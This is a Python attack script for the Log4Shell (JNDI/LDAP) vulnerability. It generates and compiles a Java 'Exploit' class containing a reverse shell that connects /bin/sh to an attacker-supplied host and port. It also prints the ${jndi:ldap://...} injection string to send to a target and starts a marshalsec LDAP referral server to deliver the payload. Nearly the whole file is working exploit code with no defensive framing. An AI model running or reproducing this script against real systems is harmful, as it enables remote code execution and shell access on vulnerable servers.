import subprocess
import os
import sys

javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version']) #stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
print("\n")

userip = input("[+] Enter IP for LDAPRefServer & Shell: ")
userport = input("[+] Enter listener port for LDAPRefServer: ")
lport = input("[+] Set listener port for shell: ")

def payload():

    javapayload = ("""

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.io.FileWriter;   // Import the FileWriter class
import java.io.IOException;  // Import the IOException class to handle errors


public class Exploit {

  public Exploit() throws Exception {
  try {
      FileWriter myWriter = new FileWriter("filename.txt");
      myWriter.write("Files in Java might be tricky, but it is fun enough!");
      myWriter.close();
      System.out.println("Successfully wrote to the file.");
    } catch (IOException e) {
      System.out.println("An error occurred.");
      e.printStackTrace();
    }
    String host="%s";
    int port=%s;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
//    so.write("test");
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}

""") % (userip,lport)

    f = open("Exploit.java", "w")
    f.write(javapayload)
    f.close()

    os.system('./jdk1.8.0_20/bin/javac Exploit.java')
    import subprocess
    subprocess.Popen("/bin/sh | nc localhost 9001", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #os.spawnl(os.P_DETACH, '/bin/sh | nc localhost 9001')
    sendme = ("${jndi:ldap://%s:1389/a}") % (userip)
    print("[+] Send me: "+sendme+"\n")

def marshalsec():
    os.system("./jdk1.8.0_20/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://{}:{}/#Exploit".format(userip, userport))

if __name__== "__main__":
    payload()
    marshalsec()
